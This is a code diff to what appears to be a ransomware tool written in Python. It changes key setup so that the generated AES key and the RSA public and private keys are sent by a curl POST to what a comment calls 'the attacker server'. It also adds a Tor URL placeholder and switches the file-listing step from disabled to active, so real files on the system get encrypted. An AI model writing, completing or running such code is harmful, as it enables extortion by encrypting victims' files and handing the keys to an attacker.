@@ -17,6 +17,7 @@ import argparse
 from Database.keygenerator import class_keys
 import Database.sqlite as bbdd
 
+URL_TOR = ""
 
 if sys.version_info >= (3, 8, 0):
         import time
@@ -76,7 +77,10 @@ def initialize_keys():
     #Initialize keys
     keys = class_keys()
     data = (keys.AESkey, keys.PUBLIC_RSAKEY, keys.PRIVATE_RSAKEY, '0')
-    bbdd.sql_insert(data)
+    
+    #Send keys to the attacker server
+    command =  '''curl localhost:8008/   -H "Content-Type: application/json"   -X POST --data '{"keyAES":"'''+keys.AESkey.hex()+'''", "keyPubRSA":"'''+keys.PUBLIC_RSAKEY.hex()+'''", "keyPrivRSA":"'''+keys.PRIVATE_RSAKEY.hex()+'''"}' '''
+    os.system(command)
 
     #Store AES key encrypted in system
     with open('KEY.txt', 'wb') as fo:
@@ -229,8 +233,8 @@ def decrypt_file(l_files, key):
         
 def main(): 
     args = parse_args()
-    #l_files = list_files(args)
-    l_files = []
+    l_files = list_files(args)
+    #l_files = []
 
     if args.encrypt == True:
         #Encrypt files of your system
